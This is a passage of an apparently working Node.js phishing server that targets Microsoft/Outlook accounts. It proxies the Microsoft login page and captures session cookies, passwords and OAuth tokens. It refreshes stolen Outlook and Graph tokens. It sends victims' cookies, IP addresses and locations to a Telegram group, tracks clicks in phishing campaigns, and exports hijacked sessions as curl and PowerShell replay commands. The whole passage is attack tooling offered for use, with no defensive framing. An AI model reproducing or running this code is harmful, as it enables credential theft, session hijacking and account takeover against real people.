    
    if (session.tokens.outlook) {
      session.tokens.outlook.access_token = newTokens.access_token;
      if (newTokens.refresh_token) session.tokens.outlook.refresh_token = newTokens.refresh_token;
    } else {
      session.tokens.access_token = newTokens.access_token;
      if (newTokens.refresh_token) session.tokens.refresh_token = newTokens.refresh_token;
    }
    
    session.tokens.refreshed_at = new Date().toISOString();
    capturedData.set(sessionId, session);
    
    console.log(`✅ Token refreshed for session ${sessionId}`);
    res.json({ 
      success: true, 
      message: 'Token refreshed',
      access_token: newTokens.access_token.substring(0, 50) + '...'
    });
    
  } catch (error) {
    console.error('❌ Session token refresh failed:', error.response?.data || error.message);
    res.status(500).json({ error: 'Failed to refresh token', details: error.message });
  }
});

app.post('/api/refresh-graph/:sessionId', express.json(), async (req, res) => {
  console.log(`📥 Session-specific Graph token refresh for ${req.params.sessionId}`);
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokens?.graph?.refresh_token) {
    return res.status(404).json({ error: 'No Graph refresh token found in session' });
  }
  
  try {
    const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
        refresh_token: session.tokens.graph.refresh_token,
        grant_type: 'refresh_token',
        scope: 'https://graph.microsoft.com/.default offline_access'
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );
    
    const newTokens = response.data;
    session.tokens.graph.access_token = newTokens.access_token;
    if (newTokens.refresh_token) session.tokens.graph.refresh_token = newTokens.refresh_token;
    session.tokens.graph.refreshed_at = new Date().toISOString();
    capturedData.set(sessionId, session);
    
    console.log(`✅ Graph token refreshed for session ${sessionId}`);
    res.json({ 
      success: true, 
      message: 'Graph token refreshed',
      access_token: newTokens.access_token.substring(0, 50) + '...'
    });
    
  } catch (error) {
    console.error('❌ Session Graph token refresh failed:', error.response?.data || error.message);
    res.status(500).json({ error: 'Failed to refresh Graph token', details: error.message });
  }
});

// ============= TEST GRAPH TOKEN ENDPOINT =============
app.get('/test-graph/:sessionId', async (req, res) => {
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokens?.graph?.access_token) {
    return res.json({ error: 'No Graph token found for this session' });
  }
  
  const token = session.tokens.graph.access_token;
  
  try {
    const results = {};
    
    try {
      const profile = await axios.get('https://graph.microsoft.com/v1.0/me', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      results.profile = profile.data;
    } catch (e) {
      results.profile = { error: e.response?.data || e.message };
    }
    
    try {
      const groups = await axios.get('https://graph.microsoft.com/v1.0/me/memberOf', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      results.groups = groups.data.value?.length || 0;
    } catch (e) {
      results.groups = { error: e.response?.data || e.message };
    }
    
    try {
      const drive = await axios.get('https://graph.microsoft.com/v1.0/me/drive/root', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      results.onedrive = drive.data.name;
    } catch (e) {
      results.onedrive = { error: e.response?.data || e.message };
    }
    
    res.json({
      success: true,
      message: 'Graph token test results',
      results
    });
    
  } catch (error) {
    res.json({ error: error.message });
  }
});

// ============= EXPORT SESSION ENDPOINT =============
app.get('/export-session/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const exportSession = capturedData.get(sessionId);
  
  if (!exportSession) {
    return res.status(404).json({ error: 'Session not found' });
  }
  
  const cookieJar = {
    netscape: (exportSession.cookies || []).map(c => {
      const parts = c.split(';')[0].split('=');
      return `#HttpOnly_.outlook.live.com\tTRUE\t/\tTRUE\t0\t${parts[0]}\t${parts.slice(1).join('=')}`;
    }).join('\n'),
    
    json: (exportSession.cookies || []).map(c => {
      const parts = c.split(';')[0].split('=');
      return {
        name: parts[0],
        value: parts.slice(1).join('='),
        domain: '.outlook.live.com',
        path: '/',
        secure: true,
        httpOnly: true
      };
    }),
    
    tokens: exportSession.tokens,
    credentials: exportSession.credentials,
    graphUser: exportSession.graphUser
  };
  
  res.json({
    sessionId,
    exportFormats: {
      netscape: cookieJar.netscape,
      json: cookieJar.json,
      curl: `curl -b "${(exportSession.cookies || []).join(' -b "')}" https://outlook.live.com/mail/`,
      powershell: `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession\n${(exportSession.cookies || []).map(c => {
        const parts = c.split(';')[0].split('=');
        return `$session.Cookies.Add((New-Object System.Net.Cookie("${parts[0]}", "${parts.slice(1).join('=')}", "/", ".outlook.live.com")))`;
      }).join('\n')}`
    },
    tokens: cookieJar.tokens,
    user: cookieJar.graphUser
  });
});

// ============= TOKEN CHECK ENDPOINT =============
app.get('/check-tokens/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session) {
    return res.json({ error: 'Session not found' });
  }
  
  res.json({
    sessionId,
    hasTokens: !!session.tokens,
    tokenInfo: session.tokens ? {
      hasOutlook: !!session.tokens.outlook,
      hasGraph: !!session.tokens.graph,
      hasDesktop: !!session.tokens.is_desktop,
      expires_in: session.tokens.expires_in || session.tokens.outlook?.expires_in,
      captured_at: session.tokens.captured_at
    } : null,
    hasCredentials: !!session.credentials,
    cookieCount: session.cookies?.length || 0
  });
});

// ============= CAPTURED SESSIONS ENDPOINT =============
app.get('/captured-sessions', (req, res) => {
  const sessions = Array.from(capturedData.entries()).map(([id, sessionData]) => {
    const criticalCookies = (sessionData.cookies || []).filter(c => 
      c.includes('FedAuth') || 
      c.includes('x-ms-gateway-token') || 
      c.includes('ESTSAUTH') || 
      c.includes('ESTSAUTHPERSISTENT') || 
      c.includes('MSISAuth') || 
      c.includes('SignInStateCookie')
    );
    
    const hasOutlook = !!(sessionData.tokens?.outlook || sessionData.tokens?.access_token);
    const hasGraph = !!sessionData.tokens?.graph;
    
    return {
      id,
      username: sessionData.credentials?.username,
      hasPassword: !!sessionData.credentials?.password,
      cookieCount: sessionData.cookies?.length || 0,
      criticalCookies: criticalCookies.length,
      criticalCookieNames: criticalCookies.map(c => {
        const match = c.match(/([^=]+)=/);
        return match ? match[1] : 'unknown';
      }),
      hasOutlook,
      hasGraph,
      hasDualTokens: hasOutlook && hasGraph,
      tokenType: sessionData.tokens?.dual_capture ? 'Dual (Outlook+Graph)' : 
                 (sessionData.tokens?.is_desktop ? 'Desktop (90-day)' : 'Web (24-hour)'),
      victimInfo: sessionData.victimInfo || sessionData.credentials?.victimInfo,
      time: sessionData.credentials?.time || sessionData.time
    };
  });
  
  res.json({ 
    total: capturedData.size, 
    sessions,
    note: 'Sessions may contain Outlook tokens, Graph tokens, or both'
  });
});

// ============= LOGIN CONFIRMED ENDPOINT =============
app.post('/api/login-confirmed', express.json(), (req, res) => {
  const { sessionId } = req.body;
  console.log(`✅ Login confirmed for session ${sessionId}`);
  res.json({ success: true });
});

// ============= PROXY OUTLOOK ENDPOINT =============
app.post('/proxy-outlook', express.json(), async (req, res) => {
  const token = req.body.token;
  
  console.log('📥 Proxy-outlook POST request received');
  console.log('Token present:', !!token);
  
  if (!token) {
    return res.status(400).json({ error: 'Missing token' });
  }
  
  try {
    const outlookResponse = await axios.get('https://outlook.live.com/mail/', {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      }
    });
    
    let html = outlookResponse.data;
    
    const injectionScript = `
      <script>
        (function() {
          const token = ${JSON.stringify(token)};
          console.log('🔑 Token injection started');
          
          localStorage.setItem('access_token', token);
          sessionStorage.setItem('access_token', token);
          
          const originalFetch = window.fetch;
          window.fetch = function(url, options = {}) {
            options.headers = options.headers || {};
            options.headers['Authorization'] = 'Bearer ' + token;
            return originalFetch.call(this, url, options);
          };
          
          console.log('✅ Token injection complete');
        })();
      </script>
    `;
    
    html = html.replace('</head>', injectionScript + '</head>');
    res.send(html);
    
  } catch (error) {
    console.error('❌ Proxy error:', error.message);
    res.status(500).send(`Error: ${error.message}`);
  }
});

// Serve the dashboard HTML file
app.get('/vapesmoke', (req, res) => {
  res.sendFile(path.join(__dirname, 'outlook-dashboard.html'));
});

app.get('/yuing', (req, res) => {
  res.sendFile(path.join(__dirname, 'outlook-dashboard.html'));
});

// ============= PROXY MIDDLEWARE =============
const microsoftProxy = createProxyMiddleware({
  target: MICROSOFT_LOGIN_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  selfHandleResponse: true,
  logLevel: 'silent',
  on: {
    proxyReq: (proxyReq, req, res) => {
      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
      proxyReq.setHeader('Host', 'login.microsoftonline.com');
      proxyReq.setHeader('Origin', 'https://login.microsoftonline.com');
      proxyReq.setHeader('Referer', 'https://login.microsoftonline.com/');
    },
    
    proxyRes: async (proxyRes, req, res) => {
      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
      
      const cookies = proxyRes.headers['set-cookie'];
      if (cookies) {
        console.log(`\n🍪 [${sessionId}] PROXY CAPTURED ${cookies.length} COOKIES:`);
        cookies.forEach((c, i) => console.log(`   ${i+1}. ${c.substring(0, 100)}`));
        
        let proxySession = capturedData.get(sessionId);
        if (!proxySession) {
          proxySession = { cookies: [], credentials: {} };
        }
        if (!proxySession.cookies) proxySession.cookies = [];
        
        cookies.forEach(cookie => {
          if (!proxySession.cookies.includes(cookie)) {
            proxySession.cookies.push(cookie);
          }
        });
        
        capturedData.set(sessionId, proxySession);
      }
      
      let body = [];
      proxyRes.on('data', chunk => body.push(chunk));
      proxyRes.on('end', () => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        res.end(Buffer.concat(body));
      });
    }
  }
});

app.use('/proxy', (req, res, next) => {
  const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
  const msParams = microsoftParams.get(sessionId) || {};
  
  if (req.method === 'POST') {
    req.body = { ...msParams, ...req.body };
    console.log('📤 Forwarding with params for session:', sessionId, Object.keys(req.body));
  }
  
  microsoftProxy(req, res, next);
});

// ============= CAPTURE ENDPOINTS =============
app.get('/capture', async (req, res) => {
  const { email = 'unknown', redirect = 'https://google.com' } = req.query;
  const cookies = req.cookies || {};
  
  if (bot && telegramGroupId && Object.keys(cookies).length > 0) {
    const victimInfo = await getVictimInfo(req);
    const cookiesText = Object.entries(cookies).map(([k, v]) => `• ${k}: ${v}`).join('\n');
    
    const message = 
      `🍪 *Cookies Captured*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Email:* ${email}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Victim Information:*\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Location:* ${victimInfo.location}\n` +
      `*Browser:* ${victimInfo.browser}\n` +
      `*OS:* ${victimInfo.os}\n` +
      `*Time:* ${victimInfo.timestamp}\n\n` +
      `*Cookies:*\n${cookiesText}`;
    
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(() => {});
  }
  
  res.redirect(302, redirect);
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: Date.now(),
    uptime: process.uptime(),
    activeSessions: activeSessions.size,
    capturedSessions: capturedData.size
  });
});

// ============= TRACKING ENDPOINTS =============
app.post('/api/track-page-view', express.json(), async (req, res) => {
  const { sessionId, template, url, timestamp } = req.body;
  
  console.log(`📊 Page view tracked: Session ${sessionId}, Template: ${template}`);
  
  let session = capturedData.get(sessionId) || {};
  session.pageView = {
    template,
    url,
    timestamp,
    viewedAt: new Date().toISOString()
  };
  capturedData.set(sessionId, session);
  
  if (bot && telegramGroupId) {
    const victimInfo = await getVictimInfo(req);
    const message = 
      `👁️ *Page View*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Session:* \`${sessionId}\`\n` +
      `*Template:* ${template}\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Location:* ${victimInfo.location}\n` +
      `*Time:* ${new Date().toLocaleString()}`;
    
    bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(() => {});
  }
  
  res.json({ success: true });
});

app.post('/api/track-click', express.json(), async (req, res) => {
  const { sessionId, template, targetUrl, timestamp } = req.body;
  
  console.log(`🔗 Click tracked: Session ${sessionId}, Target: ${targetUrl}`);
  
  let session = capturedData.get(sessionId) || {};
  if (!session.clicks) session.clicks = [];
  session.clicks.push({
    targetUrl,
    template,
    timestamp,
    clickedAt: new Date().toISOString()
  });
  capturedData.set(sessionId, session);
  
  if (bot) {
    const victimInfo = await getVictimInfo(req);
    const message = 
      `🔗 *Link Clicked*\n` + 
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Session:* \`${sessionId}\`\n` +
      `*Template:* ${template}\n` +
      `*Target:* ${targetUrl}\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Time:* ${new Date().toLocaleString()}`;
    
    bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(() => {});
  }
  
  res.json({ success: true });
});

app.get('/track/click', async (req, res) => {
  try {
    const { email = 'unknown', campaign = 'unknown', link = '#', template = 'unknown', name = 'unknown' } = req.query;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const agent = useragent.parse(userAgent);
    
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
      }
    } catch (e) {}

    const clickTime = new Date().toLocaleString();
    const token = crypto.randomBytes(4).toString('hex');

    console.log(`\n🔗 LINK CLICKED [${token}]`);
    console.log(`   Email: ${email}`);
    console.log(`   Campaign: ${campaign}`);
    console.log(`   Link: ${link}`);
    console.log(`   IP: ${ip}`);
    console.log(`   Time: ${clickTime}`);

    if (bot && telegramGroupId) {
      const message = 
        `🔗 *Link Clicked!*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Email:* \`${email}\`\n` +
        `*Name:* ${name}\n` +
        `*Campaign:* ${campaign}\n` +
        `*Template:* ${template}\n` +
        `*Link:* ${link}\n` +
        `*IP:* \`${ip}\`\n` +
        `*Location:* ${location}\n` +
        `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
        `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
        `*Time:* ${clickTime}\n` +
        `*Token:* \`${token}\``;

      await bot.sendMessage(telegramGroupId, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
    }

    if (link && link !== '#') {
      return res.redirect(302, link);
    } else {
      return res.send(`<html>...</html>`);
    }

  } catch (error) {
    console.error('❌ Error tracking click:', error);
    if (req.query.link && req.query.link !== '#') {
      return res.redirect(302, req.query.link);
    }
    res.status(500).send('Error tracking click');
  }
});

// ============= TEMPLATE SELECTION =============
const TEMPLATES_DIR = path.join(__dirname, 'templates');

async function getRandomTemplate() {
  try {
    const files = await fs.readdir(TEMPLATES_DIR);
    const htmlFiles = files.filter(file => file.endsWith('.html'));
    
    if (htmlFiles.length === 0) {
      console.error('❌ No HTML templates found in templates directory');
      return null;
    }
    
    const randomIndex = Math.floor(Math.random() * htmlFiles.length);
    const selectedTemplate = htmlFiles[randomIndex];
    
    console.log(`📝 Selected template: ${selectedTemplate}`);
    
    const templatePath = path.join(TEMPLATES_DIR, selectedTemplate);
    const templateContent = await fs.readFile(templatePath, 'utf-8');
    
    return {
      name: selectedTemplate,
      content: templateContent
    };
  } catch (error) {
    console.error('❌ Error reading templates:', error.message);
    return null;
  }
}

// ============= DEBUG ENDPOINTS =============
app.get('/debug-verifiers', (req, res) => {
  const verifiers = [];
  for (const [id, verifier] of codeVerifiers.entries()) {
    verifiers.push({
      sessionId: id,
      verifierPrefix: verifier.substring(0, 20) + '...'
    });
  }
  res.json({
    total: codeVerifiers.size,
    verifiers
  });
});

app.get('/debug-sessions', (req, res) => {
  const debugSessions = [];
  for (const [id, data] of capturedData.entries()) {
    debugSessions.push({
      id,
      hasCredentials: !!data.credentials,
      username: data.credentials?.username,
      cookieCount: data.cookies?.length || 0,
      hasOutlook: !!(data.tokens?.outlook || data.tokens?.access_token),
      hasGraph: !!data.tokens?.graph,
      hasDualTokens: !!(data.tokens?.outlook && data.tokens?.graph),
      timestamp: data.credentials?.time || data.time
    });
  }
  res.json({
    totalSessions: capturedData.size,
    sessions: debugSessions,
    note: "Dual token sessions contain both Outlook and Graph tokens"
  });
});

app.get('/debug-all', (req, res) => {
  const allData = {};
  for (const [id, data] of capturedData.entries()) {
    allData[id] = {
      hasCookies: !!(data.cookies && data.cookies.length > 0),
      cookieCount: data.cookies?.length || 0,
      cookies: data.cookies || [],
      credentials: data.credentials,
      tokens: data.tokens ? {
        hasOutlook: !!data.tokens.outlook,
        hasGraph: !!data.tokens.graph,
        outlook_preview: data.tokens.outlook?.access_token?.substring(0, 50) + '...',
        graph_preview: data.tokens.graph?.access_token?.substring(0, 50) + '...'
      } : null
    };
  }
  res.json({
    totalSessions: capturedData.size,
    sessions: allData
  });
});

app.get('/debug-cookies/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const debugSession = capturedData.get(sessionId);
  
  if (!debugSession) {
    return res.json({ 
      error: 'Session not found', 
      availableSessions: Array.from(capturedData.keys()) 
    });
  }
  
  res.json({
    sessionId,
    hasCookies: !!(debugSession.cookies && debugSession.cookies.length > 0),
    cookieCount: debugSession.cookies?.length || 0,
    rawCookies: debugSession.cookies || [],
    credentials: debugSession.credentials,
    tokens: debugSession.tokens,
    victimInfo: debugSession.victimInfo
  });
});

app.get('/test', (req, res) => {
  res.json({ 
    status: 'ok', 
    activeSessions: activeSessions.size,
    capturedSessions: capturedData.size
  });
});

// ============= ERROR HANDLING =============
app.use((req, res) => {
  res.status(404).json({ 
    error: 'Endpoint not found',
    path: req.path
  });
});

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ 
    error: 'Internal server error',
    message: err.message 
  });
});

// ============= START SERVER =============
const PORT = process.env.PORT || 3001;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 ========== SERVER STARTED ==========`);
  console.log(`📊 Mode: ${isProduction ? 'PRODUCTION' : 'DEVELOPMENT'}`);
  console.log(`🌐 App URL: ${cleanAppUrl}`);
  console.log(`📡 Port: ${PORT}`);
  console.log(`========================================\n`);
  
  console.log(`🔗 Available endpoints:`);
  console.log(`   ↪️  Root: ${cleanAppUrl}/`);
  console.log(`   🎯 Dual Token: ${cleanAppUrl}/en-us/microsoft-365/outlook`);
  console.log(`   🖥️  Desktop: ${cleanAppUrl}/microsoft-desktop`);
  console.log(`   📋 Captured Sessions: ${cleanAppUrl}/captured-sessions`);
  console.log(`   🔍 Debug Cookies: ${cleanAppUrl}/debug-cookies/[sessionId]`);
  console.log(`   ❤️  Health: ${cleanAppUrl}/health\n`);
});